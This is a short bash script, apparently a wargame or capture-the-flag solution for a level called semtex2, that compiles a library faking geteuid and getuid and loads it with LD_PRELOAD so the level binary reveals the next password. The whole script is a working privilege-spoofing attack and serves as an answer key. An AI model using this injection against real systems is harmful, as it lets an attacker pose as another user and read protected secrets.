#!/bin/bash

# Run this on the server to get the password for the next level
# Easiest method is to copy all the lines here then paste into the terminal 

mkdir /tmp/Anidear_semtex2
cd /tmp/Anidear_semtex2
echo "int geteuid(){ return 666; } int getuid(){ return 666; }" > libinject.c
gcc -m32 -fPIC -c -o libinject.o libinject.c 
gcc -m32 -shared -Wl,-soname,libinject.so -o libinject.so.1 libinject.o
LD_PRELOAD=./libinject.so.1 /semtex/semtex2

#clean up
cd ~
rm -rf /tmp/Anidear_semtex2
